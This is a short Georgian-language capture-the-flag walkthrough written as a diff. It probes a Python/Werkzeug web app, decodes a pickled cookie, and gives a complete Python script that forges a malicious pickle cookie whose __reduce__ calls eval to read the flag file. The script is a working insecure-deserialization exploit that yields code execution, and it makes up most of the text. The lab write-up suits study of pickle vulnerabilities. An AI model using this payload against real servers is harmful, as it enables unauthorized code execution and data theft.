@@ -1,0 +1,32 @@
+გამოვიყენოთ Curl კომანდი curl -I http://34.179.142.63:30485  
+ამით ვნახავთ რომ  აპლიკაცია მუშაობს პითონზე და Werkzeugზე 
+ასევე მთავრდება /dashboard
+ასევე დავაკვირდეთ data=gANYCwAAAFRyeSBIYXJkZXIhcQAu და decode გავაკეთოთ
+echo -n 'gANYCwAAAFRyeSBIYXJkZXIhcQAu' | base64 -d
+ Try Harder!q. ამოაგდო
+შევქმნათ პითონის ფაილი ამ კოდით
+import base64
+import pickle
+import requests
+
+
+class Exploit:
+    def __reduce__(self):
+        return eval, ("open('flag', 'r').read()",)
+
+
+payload = pickle.dumps(Exploit(), protocol=2)
+encoded_payload = base64.urlsafe_b64encode(payload).decode()
+
+url = "http://34.179.142.63:30485/dashboard"
+
+response = requests.get(
+    url,
+    cookies={"data": encoded_payload},
+    timeout=10
+)
+
+print(response.text)
+
+შემდეგ ტერმინალში ჩავწეროთ: py -m pip install requests და py saxeli.py და ამპადგებს CTF
+
